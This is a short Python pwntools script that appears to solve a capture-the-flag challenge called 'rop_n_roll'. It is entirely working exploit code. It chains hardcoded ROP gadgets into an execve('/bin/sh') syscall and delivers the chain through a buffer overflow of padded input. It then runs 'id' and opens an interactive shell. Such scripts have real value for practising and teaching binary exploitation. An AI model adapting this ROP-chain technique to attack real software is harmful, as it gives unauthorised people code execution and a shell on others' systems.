from pwn import *

elf = ELF ("./rop_n_roll")

r = process("./rop_n_roll")

# example : ropper --file rop_n_roll --search "pop rdx" 
POP_RDI = 0x00000000004013a3
POP_RSI_R15 = 0x00000000004013a1
POP_RDX_RAX_RBX = 0x000000000040117f
SYSCALL_POP1 = 0x00000000004011ab

BIN_SH = next(elf.search(b"/bin/sh\0"))

def syscall(rax, rdi = 0 , rsi = 0 ,rdx = 0):
	return b''.join(map(p64 , [POP_RDI, rdi, POP_RSI_R15, rsi, 0, POP_RDX_RAX_RBX, rdx, rax, 0, SYSCALL_POP1]))

rop_payload = syscall (59, BIN_SH, 0, 0)
r.sendline(b"A" * 399)
r.recvuntil(b"It was")
r.sendline(b"B"*120 + rop_payload)
r.recvuntil(b"It was")
r.clean()
r.sendline("id")
r.interactive ()
